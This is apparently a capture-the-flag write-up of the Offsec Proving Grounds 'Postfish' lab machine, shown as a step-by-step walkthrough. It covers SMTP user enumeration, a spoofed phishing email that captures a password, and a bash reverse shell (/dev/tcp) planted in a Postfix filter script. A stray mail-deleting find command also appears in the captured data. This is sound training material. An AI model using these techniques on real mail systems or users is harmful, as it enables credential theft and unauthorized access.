---
title: Writeup - Offsec PG Postfish
date: 2023-10-16  
author: kei5uke
description: Writeup for PG Postfish 
tags:
  - linux
  - writeup
---

# PostFish

# Enumeration with Nmap

```bash
┌──(root💀kali)-[~/postfish]
└─# nmap -sC -sV -p- -T4 192.168.250.137 -oN nmap.txt            
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-16 01:38 EEST
Nmap scan report for 192.168.250.137
Host is up (0.047s latency).
Not shown: 65528 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: USER AUTH-RESP-CODE STLS RESP-CODES PIPELINING UIDL CAPA TOP SASL(PLAIN)
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
143/tcp open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: LOGIN-REFERRALS ID more ENABLE OK have post-login listed IDLE SASL-IR IMAP4rev1 Pre-login STARTTLS AUTH=PLAINA0001 capabilities LITERAL+
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: LOGIN-REFERRALS ID ENABLE OK more have LITERAL+ IDLE listed IMAP4rev1 Pre-login post-login SASL-IR capabilities AUTH=PLAINA0001
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2021-01-26T10:26:37
|_Not valid after:  2031-01-24T10:26:37
|_pop3-capabilities: UIDL RESP-CODES USER PIPELINING CAPA TOP AUTH-RESP-CODE SASL(PLAIN)
|_ssl-date: TLS randomness does not represent time
```

There are many protocols for emails and HTTP.

# HTTP Page

![Screenshot 2023-10-16 at 03.24.43.png](PostFish%2040044fed3fa9498fb14f157dadde44d1/Screenshot_2023-10-16_at_03.24.43.png)

You have to add the IP address to /etc/hosts beforehand to see the page.

# Enumeration on SMTP

```bash
┌──(root💀kali)-[~/postfish]
└─# nc 192.168.250.137 25                                                                                                1 ⨯
220 postfish.off ESMTP Postfix (Ubuntu)
HELO x
250 postfish.off
MAIL FROM:root@postfish.off
250 2.1.0 Ok
RCPT TO:root
250 2.1.5 Ok
EHLO al
250-postfish.off
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
```

```bash
┌──(root💀kali)-[~/postfish]
└─# nc 192.168.250.137 143                                                                                               1 ⨯
* OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS AUTH=PLAIN] Dovecot (Ubuntu) ready.
HELO
HELO BAD Error in IMAP command received by server.
HELO x
HELO BAD Error in IMAP command received by server.
```

```bash
┌──(root💀kali)-[~/postfish]
└─# nc -vn 192.168.250.137 25                                                                                            1 ⨯
(UNKNOWN) [192.168.250.137] 25 (smtp) open
220 postfish.off ESMTP Postfix (Ubuntu)
HELO x
250 postfish.off
VRFY root
252 2.0.0 root
VRFY hr
252 2.0.0 hr
VRFY blah
550 5.1.1 <blah>: Recipient address rejected: User unknown in local recipient table
VRFY office
550 5.1.1 <office>: Recipient address rejected: User unknown in local recipient table
VRFY security
550 5.1.1 <security>: Recipient address rejected: User unknown in local recipient table
VRFY root
252 2.0.0 root
VRFY hr
252 2.0.0 hr
VRFY finance
550 5.1.1 <finance>: Recipient address rejected: User unknown in local recipient table
VRFY business
550 5.1.1 <business>: Recipient address rejected: User unknown in local recipient table
VRFY engineering
550 5.1.1 <engineering>: Recipient address rejected: User unknown in local recipient table
VRFY dev
550 5.1.1 <dev>: Recipient address rejected: User unknown in local recipient table
VRFY developer
550 5.1.1 <developer>: Recipient address rejected: User unknown in local recipient table
VRFY management
550 5.1.1 <management>: Recipient address rejected: User unknown in local recipient table
VRFY brian.moore
252 2.0.0 brian.moore
```

You can see that Sales, HR, and team members have emails.

# Sales Team Mail Inbox

```bash
──(root💀kali)-[~/postfish]
└─# nc -vn 192.168.250.137 110                                                                                           1 ⨯
(UNKNOWN) [192.168.250.137] 110 (pop3) open
+OK Dovecot (Ubuntu) ready.
USER sales
+OK
PASS sales
+OK Logged in.
list
+OK 1 messages:
1 683
.
retr 1
+OK 683 octets
Return-Path: <it@postfish.off>
X-Original-To: sales@postfish.off
Delivered-To: sales@postfish.off
Received: by postfish.off (Postfix, from userid 997)
        id B277B45445; Wed, 31 Mar 2021 13:14:34 +0000 (UTC)
Received: from x (localhost [127.0.0.1])
        by postfish.off (Postfix) with SMTP id 7712145434
        for <sales@postfish.off>; Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
Subject: ERP Registration Reminder
Message-Id: <20210331131139.7712145434@postfish.off>
Date: Wed, 31 Mar 2021 13:11:23 +0000 (UTC)
From: it@postfish.off

Hi Sales team,

We will be sending out password reset links in the upcoming week so that we can get you registered on the ERP system.

Regards,
IT
.
```

Sales team password is sales and it has a message from it team.  
From the looks of it, this can be used for phishing.

# Phishing Brian Moore

```bash
┌──(root💀kali)-[~/postfish]
└─# nc -vn 192.168.250.137 25
(UNKNOWN) [192.168.250.137] 25 (smtp) open
220 postfish.off ESMTP Postfix (Ubuntu)
HELO x
250 postfish.off
MAIL FROM: it@postfish.off
250 2.1.0 Ok
RCPT TO: brian.moore@postifh.off
454 4.7.1 <brian.moore@postifh.off>: Relay access denied
RCPT TO: brian.moore@postfish.off
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Hello brian, click the link:
http://192.168.45.198/
.
250 2.0.0 Ok: queued as 00530458F8
```

```bash
┌──(root💀kali)-[~]
└─# nc -lvp 80                                                                                                           1 ⨯
listening on [any] 80 ...
connect to [192.168.45.198] from postfish.off [192.168.250.137] 44760
POST / HTTP/1.1
Host: 192.168.45.198
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 207
Content-Type: application/x-www-form-urlencoded

first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE
```

I sent an email to Brian, while disguised as IT team with the malicious URL.
And I got the response from him.

# Decoded URL

```bash
first_name=Brian&last_name=Moore&email=brian.moore%postfish.off&username=brian.moore&password=EternaLSunshinE&confifind/var/mail/-typef!-namesales-delete_password=EternaLSunshinE
```

I got his credentials.

# Getting Shell

```bash
┌──(root💀kali)-[~/postfish]
└─# ssh brian.moore@postfish.off                                                                                       130 ⨯
brian.moore@postfish.off's password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-64-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 16 Oct 2023 12:26:48 AM UTC

  System load:  0.0               Processes:               212
  Usage of /:   52.5% of 9.78GB   Users logged in:         0
  Memory usage: 25%               IPv4 address for ens160: 192.168.250.137
  Swap usage:   0%

0 updates can be installed immediately.
0 of these updates are security updates.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

You have mail.
brian.moore@postfish:~$
```

# Shell Enumeration

```bash
brian.moore@postfish:/tmp$ id
uid=1000(brian.moore) gid=1000(brian.moore) groups=1000(brian.moore),8(mail),997(filter)
brian.moore@postfish:/tmp$ ls -la /etc/postfix/disclaimer 
-rwxrwx--- 1 root filter 1184 Oct 16 00:39 /etc/postfix/disclaimer
```

Interesting file in etc folder, shared with root, filter group 

# Change the config for postfix

```bash
brian.moore@postfish:/etc/postfix$ cat disclaimer
#!/bin/bash

sh -i >& /dev/tcp/192.168.45.198/1234 0>&1

# Localize these.
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

####### Changed From Original Script #######
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses
####### Changed From Original Script END #######

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

####### Changed From Original Script #######
# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi
####### Changed From Original Script END #######

$SENDMAIL "$@" <in.$$

exit $?
```

[How To Automatically Add A Disclaimer To Outgoing Emails With alterMIME (Postfix On Debian Squeeze)](https://www.howtoforge.com/how-to-automatically-add-a-disclaimer-to-outgoing-emails-with-altermime-postfix-on-debian-squeeze)

From the information above, this default script is run every time disclaimer user gets email. So I added the reverse shell in the script.

# Send email to trigger the shell

```bash
┌──(root💀kali)-[~]
└─# nc -v 192.168.250.137 25                                                                                             1 ⨯
postfish.off [192.168.250.137] 25 (smtp) open
220 postfish.off ESMTP Postfix (Ubuntu)
HELO x
250 postfish.off
MAIL FROM: it@postfish.off
250 2.1.0 Ok
RCPT TO: brian.moore@postifh.off
454 4.7.1 <brian.moore@postifh.off>: Relay access denied
DATA 
554 5.5.1 Error: no valid recipients
gimme the shell
502 5.5.2 Error: command not recognized
RCPT TO: brian.moore@postfish.off       
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
gimme the shell
.
250 2.0.0 Ok: queued as A51EC458F8
```

# The other user shell

```bash
┌──(root💀kali)-[/opt/generic]
└─# nc -lvnp 4444                                                                                                        1 ⨯
listening on [any] 4444 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.250.137] 41194
sh: 0: can't access tty; job control turned off
$ sudo -l
Matching Defaults entries for filter on postfish:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User filter may run the following commands on postfish:
    (ALL) NOPASSWD: /usr/bin/mail *
```

[mail|GTFOBins](https://gtfobins.github.io/gtfobins/mail/)

This user has some sudo privilege command. This can be used for exploitation.  

# Root shell

![Screenshot 2023-10-16 at 04.03.50.png](PostFish%2040044fed3fa9498fb14f157dadde44d1/Screenshot_2023-10-16_at_04.03.50.png)

# Note

Participating in this CTF was quite a challenge, as it required the creativity to formulate a phishing strategy. I am not sure if its practical for OSCP prep but at least I learned how to enumerate email protocol, I guess.

Anyway, happy hacking!